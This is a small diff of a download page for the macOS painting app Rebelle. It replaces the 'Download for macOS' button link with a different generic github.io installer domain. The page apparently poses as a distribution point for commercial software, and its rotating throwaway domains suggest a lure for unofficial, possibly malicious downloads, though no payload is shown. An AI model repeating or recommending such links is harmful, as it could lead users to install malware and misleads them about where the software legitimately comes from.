@@ -6,7 +6,7 @@
 <h3>Rebelle for macOS</h3>
 <p>Rebelle is a specialized digital painting and art creation solution designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://quick-mac-install.github.io/.github/Rebelle">
+<a href="https://software-osx-deploy.github.io/.github/Rebelle">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
